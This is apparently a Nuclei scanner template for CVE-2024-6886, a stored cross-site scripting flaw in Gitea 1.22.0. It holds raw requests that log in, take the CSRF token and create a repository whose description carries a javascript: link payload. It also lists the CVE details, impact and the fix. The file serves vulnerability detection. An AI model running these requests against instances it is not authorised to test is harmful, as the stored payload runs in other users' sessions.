http:
- extractors:
  - group: 1
    internal: true
    name: csrf_token
    regex:
    - name="_csrf" value="([^"]+)"
    type: regex
  - group: 1
    internal: true
    name: uid_name
    regex:
    - '"uid":\s*(\d+)'
    type: regex
  matchers:
  - condition: and
    part: body_5
    type: word
    words:
    - <a href="javascript:alert(document.domain)">XSS</a>
    - gitea
  - part: header_5
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /user/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    user_name={{username}}&password={{password}}

    '
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /{{username}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /repo/create HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    repo_name={{randstr}}&description=<a%20href="javascript:alert(document.domain)">XSS</a>&_csrf={{csrf_token}}&uid={{uid_name}}

    '
  - 'GET /{{username}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-6886
info:
  author: soonghee2
  classification:
    cpe: cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-6886
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:L
    cvss-score: 6.7
    cwe-id: CWE-79
    epss-percentile: 0.93807
    epss-score: 0.12911
  description: 'Gitea 1.22.0 is vulnerable to a Stored Cross-Site Scripting (XSS)
    vulnerability. This vulnerability allows an attacker to inject malicious scripts
    that get stored on the server and executed in the context of another user''s session.

    '
  impact: 'Authenticated attackers can inject malicious JavaScript into repository
    descriptions that executes in the context of other users'' sessions when they
    view the repository.

    '
  metadata:
    max-request: 4
    product: gitea
    vendor: gitea
    verified: true
  name: Gitea 1.22.0 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/52077
  - https://nvd.nist.gov/vuln/detail/CVE-2024-6886
  remediation: 'Update Gitea to version 1.22.1 or later to address the stored XSS
    vulnerability.

    '
  severity: medium
  tags: cve,cve2024,gitea,xss,authenticated,vuln
variables:
  password: '{{password}}'
  username: '{{username}}'
